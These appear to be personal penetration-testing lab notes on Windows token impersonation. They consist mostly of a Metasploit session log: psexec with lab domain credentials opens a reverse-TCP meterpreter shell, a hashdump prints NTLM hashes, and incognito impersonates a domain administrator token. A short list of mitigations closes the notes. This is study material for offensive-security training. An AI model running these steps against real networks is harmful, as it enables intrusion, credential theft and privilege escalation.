**Token Impersonation**

TOKENS<br/>
<br/>
Temporary keys that allow acces tot a system or network without having to provide credentials each time. <br/>
Like cookies<br/>
<br/>
TWO TYPES<br/>
Delegate - created for logging into a machine using Remote Desktop<br/>
Impersonate - 'non-interactive' such as attaching a network drive or a domain login script<br/>
<br/>
With a token on a machine, you can impersonate that token and attempt to run commands IE; mimikatz and dump the hashes.<br/>
You may need to move laterally to differnt machines to find tokens of value or a domain admin token.<br/>
Once you do you have the power.<br/>
<br/>
<br/>
ATTACK<br/>
<br/>
INCOGNITO<br/>
<br/>
open metasploit<br/>
load<br/>
<br/>
exploit/windows/smb/psexec<br/>
<br/>
<br/>
msf6 &gt; use exploit/windows/smb/psexec <br/>
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp<br/>
msf6 exploit(windows/smb/psexec) &gt; options<br/>
<br/>
Module options (exploit/windows/smb/psexec):<br/>
<br/>
 Name         Current Setting Required Description<br/>
 ----         --------------- -------- -----------<br/>
 RHOSTS                 yes    The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Us<br/>
                          ing-Metasploit<br/>
 RPORT         445       yes    The SMB service port (TCP)<br/>
 SERVICE_DESCRIPTION          no    Service description to to be used on target for pretty listing<br/>
 SERVICE_DISPLAY_NAME          no    The service display name<br/>
 SERVICE_NAME              no    The service name<br/>
 SMBDomain       .        no    The Windows domain to use for authentication<br/>
 SMBPass                no    The password for the specified username<br/>
 SMBSHARE                no    The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal rea<br/>
                          d/write folder share<br/>
 SMBUser                no    The username to authenticate as<br/>
<br/>
<br/>
Payload options (windows/meterpreter/reverse_tcp):<br/>
<br/>
 Name   Current Setting Required Description<br/>
 ----   --------------- -------- -----------<br/>
 EXITFUNC thread      yes    Exit technique (Accepted: '', seh, thread, process, none)<br/>
 LHOST   192.168.247.128 yes    The listen address (an interface may be specified)<br/>
 LPORT   4444       yes    The listen port<br/>
<br/>
<br/>
Exploit target:<br/>
<br/>
 Id Name<br/>
 -- ----<br/>
 0  Automatic<br/>
<br/>
<br/>
msf6 exploit(windows/smb/psexec) &gt; set rhosts 192.168.247.135<br/>
rhosts =&gt; 192.168.247.135<br/>
msf6 exploit(windows/smb/psexec) &gt; set smbdomain marvel.local<br/>
smbdomain =&gt; marvel.local<br/>
msf6 exploit(windows/smb/psexec) &gt; set smbpass Password1<br/>
smbpass =&gt; Password1<br/>
msf6 exploit(windows/smb/psexec) &gt; set smbuser lhowlette<br/>
smbuser =&gt; lhowlette<br/>
msf6 exploit(windows/smb/psexec) &gt; show target<br/>
[-] Invalid parameter &quot;target&quot;, use &quot;show -h&quot; for more information<br/>
msf6 exploit(windows/smb/psexec) &gt; show targets<br/>
<br/>
Exploit targets:<br/>
<br/>
 Id Name<br/>
 -- ----<br/>
 0  Automatic<br/>
 1  PowerShell<br/>
 2  Native upload<br/>
 3  MOF upload<br/>
 4  Command<br/>
<br/>
<br/>
msf6 exploit(windows/smb/psexec) &gt; set target 2<br/>
target =&gt; 2<br/>
msf6 exploit(windows/smb/psexec) &gt; <br/>
<br/>
msf6 exploit(windows/smb/psexec) &gt; set payload windows/x64/meterpreter/reverse_tcp<br/>
payload =&gt; windows/x64/meterpreter/reverse_tcp<br/>
msf6 exploit(windows/smb/psexec) &gt; set lhost eth0<br/>
lhost =&gt; eth0<br/>
msf6 exploit(windows/smb/psexec) &gt; <br/>
<br/>
<br/>
meterpreter &gt; getuid<br/>
Server username: NT AUTHORITY\SYSTEM<br/>
meterpreter &gt; sysinfo<br/>
Computer    : WOLVERINE<br/>
OS       : Windows 10 (10.0 Build 19044).<br/>
Architecture  : x64<br/>
System Language : en_US<br/>
Domain     : MARVEL<br/>
Logged On Users : 7<br/>
Meterpreter   : x64/windows<br/>
meterpreter &gt; hashdump<br/>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
Logan:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::<br/>
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:43e415a31348a644f60616a676d7554f:::<br/>
meterpreter &gt; Interrupt: use the 'exit' command to quit<br/>
meterpreter &gt; <br/>
<br/>
<br/>
If you want a module and your not sure which to use load and double tap TAB to open available options<br/>
<br/>
meterpreter &gt; load <br/>
load espia    load incognito  load lanattacks load powershell load python   load stdapi   load winpmem<br/>
load extapi   load kiwi    load peinjector load priv    load sniffer   load unhook   <br/>
meterpreter &gt; load Interrupt: use the 'exit' command to quit<br/>
meterpreter &gt; load incognito<br/>
<br/>
INCOGNITO HELP<br/>
<br/>
Incognito Commands<br/>
==================<br/>
<br/>
  Command       Description<br/>
  -------       -----------<br/>
  add_group_user    Attempt to add a user to a global group with all tokens<br/>
  add_localgroup_user Attempt to add a user to a local group with all tokens<br/>
  add_user       Attempt to add a user with all tokens<br/>
  impersonate_token  Impersonate specified token<br/>
  list_tokens     List tokens available under current user context<br/>
  snarf_hashes     Snarf challenge/response hashes for every token<br/>
<br/>
<br/>
meterpreter &gt; list_tokens -u<br/>
<br/>
Delegation Tokens Available<br/>
========================================<br/>
Font Driver Host\UMFD-0<br/>
Font Driver Host\UMFD-1<br/>
MARVEL\lhowlette<br/>
NT AUTHORITY\LOCAL SERVICE<br/>
NT AUTHORITY\NETWORK SERVICE<br/>
NT AUTHORITY\SYSTEM<br/>
Window Manager\DWM-1<br/>
<br/>
<br/>
Note &gt; seems admin is not on this machine. could be due to the length of time since building machine and now running attack. I will try get admin back on the machine and re attack.<br/>
<br/>
<br/>
So after logging out of user. reloaggin in as admin. logging out as admin. back in as user and reconducting the attack... <br/>
the system now how a fresh administrator token.<br/>
<br/>
meterpreter &gt; load incognito <br/>
Loading extension incognito...Success.<br/>
meterpreter &gt; list_tokens -u<br/>
<br/>
Delegation Tokens Available<br/>
========================================<br/>
Font Driver Host\UMFD-0<br/>
Font Driver Host\UMFD-3<br/>
<b>MARVEL\Administrator</b><br/>
MARVEL\lhowlette<br/>
NT AUTHORITY\LOCAL SERVICE<br/>
NT AUTHORITY\NETWORK SERVICE<br/>
NT AUTHORITY\SYSTEM<br/>
Window Manager\DWM-3<br/>
<br/>
Impersonation Tokens Available<br/>
========================================<br/>
No tokens available<br/>
<br/>
meterpreter &gt; <br/>
<br/>
meterpreter &gt; impersonate_token MARVEL\\administrator<br/>
[-] No delegation token available<br/>
[+] Successfully impersonated user MARVEL\Administrator<br/>
meterpreter &gt; <br/>
<br/>
NOTE &gt; you need 2 x \ (\\) this is for character escaping<br/>
<br/>
<br/>
C:\Windows\system32&gt;shell<br/>
shell<br/>
'shell' is not recognized as an internal or external command,<br/>
operable program or batch file.<br/>
<br/>
C:\Windows\system32&gt;whoami<br/>
whoami<br/>
nt authority\system<br/>
<br/>
C:\Windows\system32&gt;<br/>
<br/>
<br/>
NOTE &gt;&gt;&gt; TOKENS LAST UNTIL COMPUTER IS REBOOTED&gt;&gt;&gt;<br/>
<br/>
<br/>
C:\Windows\system32&gt;^C<br/>
Terminate channel 2? [y/N] y<br/>
meterpreter &gt; hashdump<br/>
[-] priv_passwd_get_sam_hashes: Operation failed: Access is denied.<br/>
meterpreter &gt; rev2self <br/>
meterpreter &gt; hashdump<br/>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
Logan:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::<br/>
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:43e415a31348a644f60616a676d7554f:::<br/>
meterpreter &gt; <br/>
<br/>
<br/>
if you exit the impersonation and you have lost priveldges. user rev2self<br/>
<br/>
<br/>
MITEGATIONS<br/>
<br/>
Limti user/group token creation permissions<br/>
account tiering - domain admin should only log into system they need IE domain<br/>
local admin restrictions - dont create local admins<br/>
user and admin account segregation<br/>
<br/>
<br/>
